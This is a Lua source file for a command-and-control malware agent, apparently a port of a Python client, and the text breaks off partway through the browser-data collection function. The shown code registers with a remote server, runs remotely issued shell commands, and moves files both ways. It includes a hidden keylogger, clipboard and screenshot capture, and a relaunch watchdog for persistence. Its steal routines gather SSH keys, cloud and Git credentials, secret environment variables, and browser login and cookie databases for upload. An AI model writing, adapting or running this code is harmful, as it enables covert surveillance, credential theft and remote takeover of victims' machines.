-- agent.lua — C2 agent, Lua port (requires luasocket).
--
-- Port of clients/agent.py with identical CLI flags, task types and result
-- shapes. Wire protocol documented in C2/protocol.md.
--
-- Install: luarocks install luasocket
--
-- Usage:
--   lua agent.lua --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
--   lua agent.lua --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
--                 --interval 5 --jitter 2 --verbose
--
-- Environment variables (accepted when the flag is not given):
--   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
--
-- Flags:
--   --server URL      server base URL (required unless C2_SERVER is set)
--   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
--   --interval N      heartbeat interval in seconds (default 10, min 1)
--   --jitter N        random jitter in seconds added to the interval
--   --state FILE      state file persisting the agent id (default ~/.c2agent.json)
--   --verbose         print activity to stdout
--   -h, --help        show this help and exit
--
-- Only use against systems you own or are authorized to test.

local socket   = require("socket")
local http     = require("socket.http")
local ltn12    = require("ltn12")
local json = nil
local jok, jmod = pcall(require, "cjson")
if not jok then jok, jmod = pcall(require, "json") end
if jok then json = jmod end

-- Fallback minimal JSON if no json module available
if not json then
    json = {}
    -- Very simple JSON encoder/decoder for the structures we need
    function json.encode(v)
        if type(v) == "string" then
            return '"' .. v:gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r'):gsub('\t', '\\t') .. '"'
        elseif type(v) == "number" then
            return tostring(v)
        elseif type(v) == "boolean" then
            return v and "true" or "false"
        elseif type(v) == "table" then
            -- Check if array
            if #v > 0 or next(v) == nil then
                local parts = {}
                for _, item in ipairs(v) do
                    parts[#parts + 1] = json.encode(item)
                end
                return "[" .. table.concat(parts, ",") .. "]"
            else
                local parts = {}
                for k, val in pairs(v) do
                    parts[#parts + 1] = json.encode(tostring(k)) .. ":" .. json.encode(val)
                end
                return "{" .. table.concat(parts, ",") .. "}"
            end
        end
        return "null"
    end

    function json.decode(s)
        -- Recursive-descent JSON decoder (handles nested objects/arrays).
        if not s or s == "" then return {} end
        if type(s) ~= "string" then return s end
        s = s:match("^%s*(.-)%s*$")
        local pos = 1

        local function skipws()
            while s:sub(pos, pos):match("%s") do pos = pos + 1 end
        end

        local function parse_value()
            skipws()
            local ch = s:sub(pos, pos)
            if ch == '"' then
                pos = pos + 1
                local buf = {}
                while pos <= #s do
                    local c = s:sub(pos, pos)
                    if c == "\\" then
                        local n = s:sub(pos + 1, pos + 1)
                        local map = { n = "\n", t = "\t", r = "\r", b = "\b", f = "\f",
                                      ['"'] = '"', ["\\"] = "\\", ["/"] = "/" }
                        if n == "u" then
                            local code = tonumber(s:sub(pos + 2, pos + 5), 16) or 0
                            buf[#buf + 1] = string.char(code % 256)
                            pos = pos + 6
                        else
                            buf[#buf + 1] = map[n] or n
                            pos = pos + 2
                        end
                    elseif c == '"' then
                        pos = pos + 1
                        break
                    else
                        buf[#buf + 1] = c
                        pos = pos + 1
                    end
                end
                return table.concat(buf)
            elseif ch == "{" then
                pos = pos + 1
                local obj = {}
                skipws()
                if s:sub(pos, pos) == "}" then pos = pos + 1 return obj end
                while true do
                    skipws()
                    local k = parse_value()
                    skipws()
                    if s:sub(pos, pos) == ":" then pos = pos + 1 end
                    local v = parse_value()
                    obj[k] = v
                    skipws()
                    local sep = s:sub(pos, pos)
                    if sep == "," then pos = pos + 1
                    else break end
                end
                skipws()
                if s:sub(pos, pos) == "}" then pos = pos + 1 end
                return obj
            elseif ch == "[" then
                pos = pos + 1
                local arr = {}
                skipws()
                if s:sub(pos, pos) == "]" then pos = pos + 1 return arr end
                while true do
                    arr[#arr + 1] = parse_value()
                    skipws()
                    local sep = s:sub(pos, pos)
                    if sep == "," then pos = pos + 1
                    else break end
                end
                skipws()
                if s:sub(pos, pos) == "]" then pos = pos + 1 end
                return arr
            elseif ch == "t" then pos = pos + 4 return true
            elseif ch == "f" then pos = pos + 5 return false
            elseif ch == "n" then pos = pos + 4 return nil
            else
                local num_end = s:find("[,%s}%]]", pos)
                local str = num_end and s:sub(pos, num_end - 1) or s:sub(pos)
                pos = num_end or (#s + 1)
                return tonumber(str)
            end
        end

        local val = parse_value()
        if val == nil then return {} end
        return val
    end
end

-- ---------------------------------------------------------------- constants

local SHELL_TIMEOUT = 120
local OUTPUT_LIMIT  = 12000
local STATE_FILE = (os.getenv("HOME") or os.getenv("USERPROFILE") or ".") .. "/.c2agent.json"

-- ---------------------------------------------------------------- globals

local server   = ""
local token    = ""
local agent_id = ""
local interval = 10
local jitter   = 0
local verbose  = false

-- Clone watcher state
local clone_watchers = {}
local clone_last_poll = {}

-- Steal constants
local STEAL_KEYWORDS = {
    "token", "secret", "password", "passwd", "key=", "api", "auth",
    "aws", "azure", "google", "github", "gitlab", "slack", "discord",
    "cookie", "session", "credential", "access", "proxy", "login",
}

local STEAL_TOKEN_FILES = {
    ".aws/credentials", ".aws/config",
    ".git-credentials", ".netrc", ".npmrc", ".pypirc",
    ".pip/pip.conf", ".config/pip/pip.conf",
    ".config/gh/hosts.yml", ".config/rclone/rclone.conf",
    ".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
    ".docker/config.json", ".kube/config",
    ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
    ".ssh/known_hosts", ".ssh/authorized_keys",
}

local STEAL_MAX_FILE = 8 * 1024 * 1024
local CHROMIUM_PROFILE_FILES = {"Login Data", "Cookies", "Web Data"}
local FIREFOX_PROFILE_FILES = {"cookies.sqlite", "logins.json", "key4.db", "cert9.db"}

-- ---------------------------------------------------------------- helpers

local IS_WIN   = (os.getenv("OS") == "Windows_NT")
local DEVNULL  = IS_WIN and "NUL" or "/dev/null"

local function logmsg(msg)
    if verbose then print("[*] " .. msg) end
end

local function mkdirp(path)
    if path == nil or path == "" then return end
    if IS_WIN then
        return os.execute('mkdir "' .. path .. '" >NUL 2>&1')
    end
    os.execute("mkdir -p '" .. path .. "' 2>/dev/null")
end

local function rmtree(path)
    if path == nil or path == "" then return end
    if IS_WIN then
        return os.execute('rd /s /q "' .. path .. '" >NUL 2>&1')
    end
    os.execute("rm -rf '" .. path .. "' 2>/dev/null")
end

local _tmp_n = 0
local function mktmp()
    _tmp_n = _tmp_n + 1
    local name = "c2tmp" .. os.time() .. "_" .. _tmp_n
    if IS_WIN then
        return (os.getenv("TEMP") or os.getenv("TMP") or ".") .. "\\" .. name
    end
    return "/tmp/" .. name
end

local function truncate_output(text)
    if #text <= OUTPUT_LIMIT then return text end
    local head = math.floor(OUTPUT_LIMIT / 5)
    local tail = OUTPUT_LIMIT - head - 40
    return text:sub(1, head)
        .. "\n... [" .. (#text - head - tail) .. " chars truncated] ...\n"
        .. text:sub(-tail)
end

local function shell_capture(cmd)
    local handle, err = io.popen(cmd)
    if not handle then return "" end
    local out = handle:read("*a")
    handle:close()
    return (out:gsub("^%s*(.-)%s*$", "%1")) or ""
end

local function local_ip()
    local udp = socket.udp()
    if udp then
        udp:setpeername("8.8.8.8", 80)
        local ip = udp:getsockname()
        udp:close()
        if ip and ip ~= "" then return ip end
    end
    return shell_capture("curl -s --max-time 2 ifconfig.me 2>" .. DEVNULL .. " || echo ''")
end

local function get_hostname()
    local h = os.getenv("COMPUTERNAME") or os.getenv("HOSTNAME")
    if h and h ~= "" then return h end
    return shell_capture("hostname 2>" .. DEVNULL .. " || echo unknown")
end

local function get_username()
    local user = os.getenv("USER") or os.getenv("USERNAME") or ""
    if user == "" then
        user = shell_capture("whoami 2>" .. DEVNULL .. " || echo ''")
    end
    return user
end

local function get_os()
    if IS_WIN then return "windows" end
    return shell_capture("uname -s 2>" .. DEVNULL .. " || echo unknown"):lower()
end

local function get_arch()
    if IS_WIN then
        return os.getenv("PROCESSOR_ARCHITEW6432") or os.getenv("PROCESSOR_ARCHITECTURE") or ""
    end
    return shell_capture("uname -m 2>" .. DEVNULL .. " || echo ''")
end

local function getpid()
    if IS_WIN then
        local out = shell_capture("wmic process where name='lua.exe' get processid /value 2>" .. DEVNULL)
        local pid = tonumber(out:match("ProcessId=(%d+)"))
        if not pid then
            pid = tonumber(shell_capture("powershell -NoProfile -Command $PID"):match("%d+"))
        end
        return pid or 0
    end
    local f = io.open("/proc/self/stat")
    if f then
        local first = f:read("*l"):match("^(%d+)")
        f:close()
        return tonumber(first) or 0
    end
    return tonumber(os.getenv("PPID") or "0") or 0
end

-- ---------------------------------------------------------------- JSON HTTP

local function post_json(path, body)
    local payload = json.encode(body)
    local response_body = {}
    local res, code, headers, status = http.request({
        url = server .. path,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["X-Agent-Token"] = token,
            ["Content-Length"] = tostring(#payload),
        },
        source = ltn12.source.string(payload),
        sink = ltn12.sink.table(response_body),
    })
    local resp_text = table.concat(response_body)
    return resp_text, code or 0
end

local function get_url(path)
    local response_body = {}
    local res, code, headers, status = http.request({
        url = server .. path,
        method = "GET",
        headers = {
            ["X-Agent-Token"] = token,
        },
        sink = ltn12.sink.table(response_body),
    })
    return table.concat(response_body), code or 0
end

-- ---------------------------------------------------------------- state

local function load_id()
    local f = io.open(STATE_FILE, "r")
    if f then
        local content = f:read("*a")
        f:close()
        local data = json.decode(content)
        if data and data.agent_id then
            agent_id = data.agent_id
        end
    end
end

local function save_id()
    local f = io.open(STATE_FILE, "w")
    if f then
        f:write(json.encode({agent_id = agent_id}))
        f:close()
    end
end

-- ------------------------------------------------------------- lifecycle

local function register()
    local body = {
        agent_id = agent_id ~= "" and agent_id or nil,
        hostname = get_hostname(),
        username = get_username(),
        ["os"]   = get_os(),
        arch     = get_arch(),
        pid      = getpid(),
        ip       = local_ip(),
        version  = "1.0",
        ["type"] = "Lua",
    }
    logmsg("registering with " .. server)
    local resp, code = post_json("/api/register", body)
    if code ~= 200 then
        logmsg("register failed: HTTP " .. code .. " — will retry on next checkin")
        return
    end
    local data = json.decode(resp)
    agent_id = data.agent_id or ""
    save_id()
    logmsg("agent id: " .. agent_id)
end

local function checkin()
    local resp, code = post_json("/api/checkin", {agent_id = agent_id})
    if code == 404 then
        logmsg("server does not know us — re-registering")
        register()
        return {}
    end
    if code ~= 200 then
        logmsg("checkin failed: HTTP " .. code)
        return {}
    end
    local data = json.decode(resp)
    return data.tasks or {}
end

local function report(task_id, output, exit_code, err)
    post_json("/api/result", {
        agent_id  = agent_id,
        task_id   = task_id,
        output    = output or "",
        exit_code = exit_code or 0,
        error     = err or "",
    })
end

-- ---------------------------------------------------------------- tasks

local function run_shell(command, timeout)
    timeout = timeout or SHELL_TIMEOUT
    logmsg("executing: " .. command)
    local tmpfile = mktmp()
    if IS_WIN then
        local bat = tmpfile .. ".bat"
        local bf = io.open(bat, "wb")
        if bf then
            bf:write("@echo off\r\n(" .. command .. ") > \"" .. tmpfile .. "\" 2>&1\r\necho EXIT:%ERRORLEVEL%>> \"" .. tmpfile .. "\"\r\n")
            bf:close()
            os.execute('cmd /c "' .. bat .. '" >NUL 2>&1')
            os.remove(bat)
        end
    else
        local cmd = string.format(
            'timeout %d sh -c %s > %s 2>&1; printf "\\nEXIT:%%s\\n" "$?" >> %s',
            timeout,
            "'" .. command:gsub("'", "'\\''") .. "'",
            tmpfile,
            tmpfile
        )
        local handle = io.popen(cmd)
        if handle then
            handle:close()
        end
    end
    local f = io.open(tmpfile, "r")
    local output = ""
    local exit_code = 1
    if f then
        output = f:read("*a") or ""
        f:close()
        os.remove(tmpfile)
        -- Extract exit code
        local code_str = output:match("\nEXIT:(%d+)") or output:match("EXIT:(%d+)")
        if code_str then
            exit_code = tonumber(code_str) or 1
            output = output:gsub("\nEXIT:%d+\n?$", ""):gsub("\nEXIT:%d+$", ""):gsub("EXIT:%d+$", "")
        end
    end
    return truncate_output(output), exit_code
end

local function task_download(task_id, args)
    local fname = args.file or "payload.bin"
    local dest = args.destination or fname
    logmsg("downloading " .. fname .. " to " .. dest)
    local resp, code = get_url("/api/files/" .. task_id)
    if code ~= 200 then
        return "download failed: HTTP " .. code, 1
    end
    -- Check if dest is a directory
    local attr = lfs and lfs.attributes(dest)
    if attr and attr.mode == "directory" then
        dest = dest .. "/" .. fname:match("([^/\\]+)$")
    end
    -- Create parent directory
    local parent = dest:match("(.+)[/\\]")
    if parent then
        mkdirp(parent)
    end
    local f = io.open(dest, "wb")
    if not f then
        return "failed to write " .. dest, 1
    end
    f:write(resp)
    f:close()
    return "saved " .. #resp .. " bytes to " .. dest, 0
end

local function task_upload(task_id, args)
    local path = args.path or ""
    if path == "" then
        return "no path given", 1
    end
    logmsg("uploading " .. path)
    -- Read file content
    local f = io.open(path, "rb")
    if not f then
        return "file not found: " .. path, 1
    end
    local content = f:read("*a")
    f:close()

    -- Multipart upload via curl
    local tmpfile = mktmp()
    local tmpf = io.open(tmpfile, "wb")
    if tmpf then
        tmpf:write(content)
        tmpf:close()
    end
    local cmd = string.format(
        'curl -s -X POST "%s/api/files/%s" '
        .. '-H "X-Agent-Token: %s" '
        .. '-F "file=@%s" '
        .. '--max-time 300 -o %s -w "%%{http_code}"',
        server, task_id, token, tmpfile, DEVNULL
    )
    local handle = io.popen(cmd)
    local resp_code = "0"
    if handle then
        resp_code = handle:read("*a"):match("^%s*(.-)%s*$") or "0"
        handle:close()
    end
    os.remove(tmpfile)
    if resp_code == "200" then
        return "uploaded " .. path, 0
    else
        return "upload failed: HTTP " .. resp_code, 1
    end
end

-- ---------------------------------------------------------------- keylog
-- File-based keystroke logger. 'start' spawns a background collector
-- (PowerShell GetAsyncKeyState on Windows, xinput->awk on Linux) that appends
-- to a log file; 'dump' stops the collector and returns the captured text.

local PS_COL = [==[
$C2P = '@C2P@'; $C2K = '@C2K@'
[IO.File]::WriteAllText($C2P, [string]$PID)
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);[DllImport("user32.dll")]public static extern short GetKeyState(int v);}'
$l = New-Object 'bool[]' 256
while (1) {
  Start-Sleep -Milliseconds 25
  for ($v = 8; $v -le 190; $v++) {
    $d = (([K]::GetAsyncKeyState($v) -band 1) -ne 0)
    if ($d -ne $l[$v]) {
      if ($d) {
        $c = $null
        if ($v -ge 65 -and $v -le 90) { $sh = (([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0); $cp = (([K]::GetKeyState(20) -band 1) -ne 0); $c = [char]($v + $(if ($sh -ne $cp) { 0 } else { 32 })) }
        elseif ($v -ge 48 -and $v -le 57) { $c = [char]$v } elseif ($v -eq 32) { $c = ' ' }
        elseif ($v -eq 13) { $c = [char]10 } elseif ($v -eq 9) { $c = '[TAB]' }
        elseif ($v -eq 8) { $c = '[BACKSPACE]' } elseif ($v -eq 27) { $c = '[ESC]' } elseif ($v -eq 46) { $c = '[DEL]' }
        elseif ($v -eq 37) { $c = '[LEFT]' } elseif ($v -eq 38) { $c = '[UP]' }
        elseif ($v -eq 39) { $c = '[RIGHT]' } elseif ($v -eq 40) { $c = '[DOWN]' }
        elseif ($v -ge 112 -and $v -le 123) { $c = '[F' + ($v - 111) + ']' }
        elseif ($v -eq 186) { $c = ';' } elseif ($v -eq 187) { $c = '=' }
        elseif ($v -eq 188) { $c = ',' } elseif ($v -eq 189) { $c = '-' }
        elseif ($v -eq 190) { $c = '.' } elseif ($v -eq 191) { $c = '/' }
        elseif ($v -eq 192) { $c = '`' } elseif ($v -eq 219) { $c = '[' }
        elseif ($v -eq 220) { $c = '\' } elseif ($v -eq 221) { $c = ']' }
        elseif ($v -eq 222) { $c = "'" }
        if ($c) { [IO.File]::AppendAllText($C2K, [string]$c) }
      }
      $l[$v] = $d
    }
  }
}
]==]

local SH_COL = [==[
#!/bin/sh
C2P='@C2P@'; C2K='@C2K@'
echo $$ > "$C2P"
kid=$(xinput list 2>/dev/null | grep -i -m1 keyboard | sed -E 's/.*id=([0-9]+).*/\1/')
[ -z "$kid" ] && exit 1
xinput test "$kid" 2>/dev/null | awk -v p="$C2K" '
BEGIN { n = split("2 3 4 5 6 7 8 9 10 11 16 17 18 19 20 21 22 23 24 25 30 31 32 33 34 35 36 37 38 44 45 46 47 48 49 50", a, " "); s = "1234567890qwertyuiopasdfghjklzxcvbnm"; for (i = 1; i <= length(s); i++) m[a[i]] = substr(s, i, 1) }
{ if ($1 == "key" && $2 == "press") { c = m[$3]; if ($3 == 57) c = " "; else if ($3 == 28) c = "\n"; else if ($3 == 15) c = "[TAB]"; else if ($3 == 14) c = "[BACKSPACE]"; else if ($3 == 1) c = "[ESC]"; else if ($3 == 111) c = "[DEL]"; else if ($3 == 42 || $3 == 54) c = "[SHIFT]"; else if ($3 == 29 || $3 == 97) c = "[CTRL]"; else if ($3 == 56 || $3 == 100) c = "[ALT]"; if (c != "") printf "%s", c > p } }'
]==]

local function file_exists(p)
    local f = io.open(p, "rb")
    if f then f:close(); return true end
    return false
end

local function klog_base()
    local sep = package.config:sub(1, 1)
    local dir = (sep == "\\" and os.getenv("TEMP")) or "/tmp"
    return dir .. "/.c2keylog_" .. agent_id
end

local function proc_alive(pid)
    pid = (pid or ""):match("%d+") or ""
    if pid == "" or tonumber(pid) <= 0 then return false end
    if get_os():find("win") then
        local ok, _, code = os.execute('tasklist /FI "PID eq ' .. pid .. '" >NUL 2>NUL')
        return ok == true and code == 0
    end
    local ok, _, code = os.execute("kill -0 " .. pid .. " 2>/dev/null")
    return ok == true and code == 0
end

local function klog_write(base, pidf, logf)
    local f = io.open(base .. ".ps1", "wb")
    f:write(PS_COL:gsub("@C2P@", pidf):gsub("@C2K@", logf))
    f:close()
    local g = io.open(base .. ".sh", "wb")
    g:write(SH_COL:gsub("@C2P@", pidf):gsub("@C2K@", logf))
    g:close()
end

local function klog_start()
    local base = klog_base()
    local pidf, logf = base .. ".pid", base .. ".log"
    if file_exists(pidf) then
        local f = io.open(pidf, "rb")
        local pid = f and f:read("*a") or ""
        if f then f:close() end
        if proc_alive(pid) then
            return "keylogger already running"
        end
    end
    klog_write(base, pidf, logf)
    os.remove(logf)
    if get_os():find("win") then
        os.execute('cmd /c start "" /b powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' .. base .. '.ps1" >NUL 2>&1')
    elseif get_os() == "darwin" then
        return "error: keylogger not supported on macOS"
    else
        os.execute("nohup sh '" .. base .. ".sh' >/dev/null 2>&1 &")
    end
    for _ = 1, 25 do
        if file_exists(pidf) then break end
        if get_os():find("win") then
            os.execute('powershell -NoProfile -Command "Start-Sleep -Milliseconds 200"')
        else
            os.execute("sleep 0.1 2>/dev/null")
        end
    end
    if not file_exists(pidf) then
        return "error: no keylogging tool available (powershell/xinput needed)"
    end
    return "keylogger started"
end

local function klog_stop()
    local pidf = klog_base() .. ".pid"
    if not file_exists(pidf) then return "keylogger not running" end
    local f = io.open(pidf, "rb")
    local pid = f and (f:read("*a") or "") or ""
    if f then f:close() end
    pid = pid:match("%d+") or ""
    if proc_alive(pid) then
        if get_os():find("win") then
            os.execute("taskkill /PID " .. pid .. " /F /T >NUL 2>&1")
        else
            os.execute("kill -9 " .. pid .. " >/dev/null 2>&1")
        end
    end
    os.remove(pidf)
    return "keylogger stopped"
end

local function klog_dump()
    local stopped = klog_stop()
    if stopped ~= "keylogger stopped" and stopped ~= "keylogger not running" then
        return stopped, 1
    end
    local f = io.open(klog_base() .. ".log", "rb")
    local text = ""
    if f then text = f:read("*a") or ""; f:close() end
    if text == "" then return "(no keystrokes recorded)", 0 end
    if #text > 8000 then text = "..." .. string.sub(text, #text - 8000) end
    return text, 0
end

local function task_keylog(args)
    local action = (args.action or "dump"):lower()
    if action == "start" then
        return klog_start(), 0
    elseif action == "stop" then
        return klog_stop(), 0
    else
        return klog_dump()
    end
end

local function task_clipboard(args)
    local action = (args.action or "get"):lower()
    if action == "set" then
        local text = args.text or ""
        local cmd
        if IS_WIN then
            cmd = "powershell -NoProfile -Command \"Set-Clipboard -Value '" .. text:gsub("'", "''") .. "'\""
        elseif get_os() == "darwin" then
            cmd = "echo " .. "'" .. text:gsub("'", "'\\''") .. "' | pbcopy"
        elseif io.popen("which xclip 2>/dev/null"):read("*a"):match("%S") then
            cmd = "echo " .. "'" .. text:gsub("'", "'\\''") .. "' | xclip -selection clipboard"
        else
            return "no clipboard tool available", 0
        end
        os.execute(cmd)
        return "clipboard set", 0
    else
        local handle
        if IS_WIN then
            handle = io.popen("powershell -NoProfile -Command \"[Console]::Out.Write((Get-Clipboard -Raw -EA SilentlyContinue))\"")
        elseif get_os() == "darwin" then
            handle = io.popen("pbpaste 2>/dev/null")
        elseif io.popen("which xclip 2>/dev/null"):read("*a"):match("%S") then
            handle = io.popen("xclip -selection clipboard -o 2>/dev/null")
        else
            return "no clipboard tool available", 0
        end
        if handle then
            local text = handle:read("*a") or ""
            handle:close()
            return text, 0
        end
        return "error: clipboard read failed", 1
    end
end

local function task_screenshot(task_id, args)
    local label = (args.name or "screenshot"):gsub("%s+", "")
    if label == "" then label = "screenshot" end
    local tmpfile = mktmp() .. ".png"
    local osname = get_os()
    local ok = false
    local ps_err
    if osname == "darwin" then
        os.execute("screencapture -x '" .. tmpfile .. "' 2>/dev/null")
        local probe = io.open(tmpfile, "rb")
        if probe then probe:close(); ok = true end
    elseif osname:find("win") then
        os.execute("powershell -NoProfile -command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing;$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);$g=[System.Drawing.Graphics]::FromImage($bmp);$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);$bmp.Save('" .. tmpfile .. "')\" 2>\"" .. tmpfile .. ".err\"")
        local probe = io.open(tmpfile, "rb")
        if probe then probe:close(); ok = true
        else
            local ef = io.open(tmpfile .. ".err", "rb")
            if ef then ps_err = ef:read("*a") or ""; ef:close() end
            logmsg("screenshot powershell error: " .. tostring(ps_err))
        end
        os.remove(tmpfile .. ".err")
    else
        for _, tool in ipairs({"screencapture -x '"..tmpfile.."'", "import -window root '"..tmpfile.."'", "scrot '"..tmpfile.."'", "gnome-screenshot -f '"..tmpfile.."' 2>/dev/null"}) do
            local f = io.open("/dev/null", "w")
            local got = io.popen("which " .. tool:match("^(%S+)"))
            local has = got and got:read("*a"):match("%S")
            if got then got:close() end
            if has then
                os.execute(tool)
                local probe = io.open(tmpfile, "rb")
                if probe then probe:close(); ok = true break end
            end
        end
    end
    if not ok then
        return "no screenshot tool available"
            .. (ps_err and (": " .. (ps_err:gsub("%s+", " "))) or ""), 0
    end
    local cmd = string.format(
        'curl -s -X POST "%s/api/files/%s" '
        .. '-H "X-Agent-Token: %s" '
        .. '-F "file=@%s;filename=%s.png" '
        .. '--max-time 120 -o %s -w "%%{http_code}"',
        server, task_id, token, tmpfile, label, DEVNULL
    )
    local handle = io.popen(cmd)
    local resp_code = "0"
    if handle then
        resp_code = handle:read("*a"):match("^%s*(.-)%s*$") or "0"
        handle:close()
    end
    os.remove(tmpfile)
    if resp_code == "200" then
        return "screenshot saved (" .. label .. ".png)", 0
    else
        return "screenshot upload failed: HTTP " .. resp_code, 1
    end
end

-- ------------------------------------------------------------------ clone
-- Cross-agent resurrection watchdog. Monitors a target agent via the
-- server; if dead/stale, runs a relaunch command. Watches are polled
-- during the main-loop sleep phase on their own cadence.

local function now_str()
    local handle
    if get_os():find("win") then
        handle = io.popen('powershell -NoProfile -Command "Get-Date -Format \'yyyy-MM-dd HH:mm:ss\' -AsUTC" 2>NUL')
    else
        handle = io.popen("date -u '+%Y-%m-%d %H:%M:%S' 2>/dev/null")
    end
    if handle then
        local d = handle:read("*a"):match("^%s*(.-)%s*$") or ""
        handle:close()
        if d ~= "" then return d end
    end
    return tostring(os.time())
end

local function clone_check(target)
    local resp, code = get_url("/api/clone/status/" .. target)
    local watcher = clone_watchers[target]
    if not watcher then return end
    watcher.last_check = now_str()
    if code == 404 then
        watcher.status = "unknown"
    elseif code == 200 then
        local data = json.decode(resp)
        local st = data.status or "unknown"
        watcher.status = st
        if (st == "dead" or st == "stale") and watcher.command ~= "" then
            watcher.relaunches = watcher.relaunches + 1
            logmsg("clone: target " .. target .. " " .. st .. " -> relaunching")
            if get_os():find("win") then
                os.execute('start /b cmd /c "' .. watcher.command .. '" >NUL 2>&1')
            else
                os.execute("nohup " .. watcher.command .. " >/dev/null 2>&1 &")
            end
        end
    else
        watcher.status = "http " .. tostring(code)
    end
end

local function clone_poll()
    local now = os.time()
    for target, watcher in pairs(clone_watchers) do
        local last = clone_last_poll[target] or 0
        if now - last >= (watcher.interval or 30) then
            clone_last_poll[target] = now
            clone_check(target)
        end
    end
end

local function task_clone(args)
    local action = (args.action or "start"):lower()
    local target = (args.target or ""):match("^%s*(.-)%s*$")
    if target == "" then target = agent_id end
    local command = (args.command or ""):match("^%s*(.-)%s*$")
    local intv = 30
    if args.interval then
        local n = tonumber(args.interval)
        if n then intv = math.max(5, math.min(n, 3600)) end
    end

    if action == "stop" then
        if not clone_watchers[target] then
            return "clone: no watcher for " .. target, 1
        end
        clone_watchers[target] = nil
        clone_last_poll[target] = nil
        return "clone: watcher for " .. target .. " stopped", 0
    end

    if action == "status" then
        local count = 0
        for _ in pairs(clone_watchers) do count = count + 1 end
        if count == 0 then
            return "clone: no watchers running", 0
        end
        local lines = {}
        for tid, w in pairs(clone_watchers) do
            lines[#lines + 1] = string.format(
                "  %s: %s | last_check %s | relaunched %dx | cmd: %s",
                tid, w.status or "?", w.last_check or "never",
                w.relaunches or 0, w.command or "(none)")
        end
        table.sort(lines)
        return "clone watchers:\n" .. table.concat(lines, "\n"), 0
    end

    -- start
    if clone_watchers[target] then
        return "clone: watcher for " .. target .. " already running", 1
    end
    if command == "" then
        return "clone: 'command' (relaunch cmd) required", 1
    end
    clone_watchers[target] = {
        status = "starting",
        last_check = "never",
        relaunches = 0,
        command = command,
        interval = intv,
    }
    clone_last_poll[target] = os.time()
    -- Immediate first check
    clone_check(target)
    return string.format(
        "clone: watcher started on target %s (every %ds, restart cmd: %s)",
        target, intv, command), 0
end

-- ------------------------------------------------------------------ steal
-- Collect env vars, token files and raw browser DB copies into a temp
-- directory, zip it and upload via /api/files/{task_id}. No decryption.

local function steal_env(work)
    local lines = {}
    local handle
    if get_os():find("win") then
        handle = io.popen("set 2>NUL")
    else
        handle = io.popen("env 2>/dev/null || printenv 2>/dev/null")
    end
    if handle then
        for line in handle:lines() do
            local key = line:match("^([^=]+)")
            if key then
                local low = key:lower()
                for _, kw in ipairs(STEAL_KEYWORDS) do
                    if low:find(kw, 1, true) then
                        lines[#lines + 1] = line
                        break
                    end
                end
            end
        end
        handle:close()
    end
    if #lines == 0 then return {} end
    table.sort(lines)
    local f = io.open(work .. "/env.txt", "w")
    if f then
        f:write(table.concat(lines, "\n") .. "\n")
        f:close()
    end
    return {"env.txt"}
end

local function steal_tokens(work)
    local hits = {}
    local home = os.getenv("HOME") or os.getenv("USERPROFILE") or ""
    if home == "" then return {} end
    local tokendir = work .. "/tokens"
    mkdirp(tokendir)
    for _, rel in ipairs(STEAL_TOKEN_FILES) do
        local src = home .. "/" .. rel
        local attr = io.open(src, "rb")
        if attr then
            local content = attr:read("*a")
            attr:close()
            if #content <= STEAL_MAX_FILE then
                local basename = src:match("([^/\\]+)$") or rel
                local dst = tokendir .. "/" .. basename
                local df = io.open(dst, "wb")
                if df then
                    df:write(content)
                    df:close()
                    hits[#hits + 1] = "tokens/" .. basename
                end
            end
        end
    end
    return hits
end

local function steal_browser_walk(root, targets)
    local files = {}
    local osname = get_os()
    local handle
    if osname:find("win") then
        local name_filter = ""
        for i, t in ipairs(targets) do
            if i > 1 then name_filter = name_filter .. ",'" .. t .. "'"
            else name_filter = "'" .. t .. "'" end
        end
        handle = io.popen(string.format(
            "powershell -NoProfile -Command \"Get-ChildItem -Path '%s' -Recurse -File -EA SilentlyContinue | Where-Object {$_.Name -in @(%s)} | ForEach-Object {$_.FullName}\"",
            root:gsub("'", "''"), name_filter))
    else
        local expr = ""
        for i, t in ipairs(targets) do
            if i > 1 then expr = expr .. " -o " end
            expr = expr .. '-name "' .. t .. '"'
        end
        handle = io.popen(string.format('find "%s" -type f \\( %s \\) 2>/dev/null', root, expr))
    end
    if handle then
        for line in handle:lines() do
            local fp = line:match("^%s*(.-)%s*$") or ""
            if fp ~= "" then files[#files + 1] = fp end
        end
        handle:close()
    end
    return files
end

local function steal_browser_collect(work)
    local hits = {}
    local home = os.getenv("HOME") or os.getenv("USERPROFILE") or ""
    local osname = get_os()
    local roots = {}
    if osname:find("win") then
        local la = os.getenv("LOCALAPPDATA") or ""
        local appd = os.getenv("APPDATA") or ""
        if la ~= "" then
            roots[la .. "/Google/Chrome/User Data"] = "chromium"
            roots[la .. "/Microsoft/Edge/User Data"] = "chromium"
            roots[la .. "/BraveSoftware/Brave-Browser/User Data"] = "chromium"
            roots[la .. "/Opera Software/Opera Stable"] = "chromium"
        end
        if appd ~= "" then
            roots[appd .. "/Mozilla/Firefox/Profiles"] = "firefox"
        end
    elseif osname == "darwin" then
        local base = home .. "/Library/Application Support"
        roots[base .. "/Google/Chrome"] = "chromium"
        roots[base .. "/Microsoft Edge"] = "chromium"
        roots[base .. "/BraveSoftware/Brave-Browser"] = "chromium"
        roots[base .. "/Firefox/Profiles"] = "firefox"
    else
        for _, name in ipairs({"google-chrome", "chromium", "microsoft-edge",
                               "msedge", "brave-browser", "brave", "opera"}) do
            roots[home .. "/.config/" .. name] = "chromium"
        end
        roots[home .. "/.mozilla/firefox"] = "firefox"
    end
    for root, kind in pairs(roots) do
        local targets = (kind == "firefox") and FIREFOX_PROFILE_FILES or CHROMIUM_PROFILE_FILES
